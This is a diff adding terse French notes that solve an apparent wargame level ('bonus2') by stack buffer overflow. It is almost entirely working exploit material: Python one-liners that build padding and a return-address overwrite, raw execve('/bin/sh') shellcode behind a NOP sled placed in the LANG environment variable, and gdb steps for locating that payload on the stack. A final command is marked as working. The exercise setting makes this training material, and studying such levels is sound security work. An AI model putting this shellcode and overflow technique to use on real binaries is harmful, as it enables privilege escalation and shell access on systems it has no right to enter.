@@ -1,0 +1,28 @@
+
+$(python -c 'print "A"*4 + "DDDD" + "C"*32') $(python -c 'print "B"*26')
+Pattern generator : offset 26 pour EIP
+
+
+Etape 1:
+env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb bonus2
+env -i payload=$(python -c 'print "\x90"*100+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x90"*100') gdb bonus2
+
+Etape 2:
+(gdb) b main
+Breakpoint 1 at 0x80485a7
+(gdb) r
+Starting program: /home/user/bonus0/bonus0 
+
+Breakpoint 1, 0x080485a7 in main ()
+
+(gdb) x/500s $esp
+//Trouver le payload dans la stack et recuperer une adresse en milieu de payload//
+[...]
+0xbfffff1e:	 "\220\220\220\220...
+[...]
+
+$(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\x63\xfe\xff\xbf"')
+
+CA MARCHE :
+
+env -i LANG=$(python -c 'print "nl" + "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\x63\xfe\xff\xbf"')
